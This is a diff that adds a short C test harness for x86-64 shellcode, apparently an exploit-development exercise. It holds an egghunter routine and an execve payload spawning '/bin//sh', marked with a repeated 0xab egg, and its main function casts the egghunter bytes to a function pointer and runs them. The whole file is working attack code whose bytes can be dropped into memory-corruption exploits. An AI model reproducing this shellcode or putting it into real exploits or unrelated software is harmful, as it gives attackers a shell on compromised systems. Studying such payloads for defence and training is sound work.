@@ -1,0 +1,21 @@
+#include <stdio.h>
+#include <string.h>
+
+unsigned char egghunter[] = \
+"\xb8\xab\xab\xab\xab\x54\x5b\x48\xff\xc3\x53\x5f\xaf\x75\xf8\xaf\x75\xf5\xff\xe7";
+
+int main(){
+
+/* EGG + Execve Payload */
+
+unsigned char shellcode[] = \
+"\xab\xab\xab\xab"
+"\xab\xab\xab\xab"
+"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
+
+        printf("EggHunter length: %d\n", strlen(egghunter));
+        printf("Shellcode length: %d\n", strlen(shellcode));
+
+        int (*ret)() = (int(*)())egghunter;
+        ret();
+}
